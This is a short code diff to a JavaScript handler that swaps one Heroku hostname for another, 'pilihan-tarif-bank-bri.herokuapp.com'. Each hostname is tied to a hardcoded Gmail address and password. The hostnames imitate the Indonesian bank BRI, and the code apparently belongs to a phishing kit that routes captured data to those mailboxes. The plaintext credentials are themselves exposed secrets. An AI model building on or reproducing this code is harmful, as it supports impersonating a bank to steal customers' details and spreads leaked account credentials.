@@ -19,7 +19,7 @@ export default function handler(req, res) {
        pass = 'lzefwsxzaeftnrip'
     }else
     
-   if (url == 'pilihan-tarif-brii-terbaru.herokuapp.com'){
+   if (url == 'pilihan-tarif-bank-bri.herokuapp.com'){
 
        email = 'linkgoggle500@gmail.com'
        pass = 'dapwydphkoqywtiw'
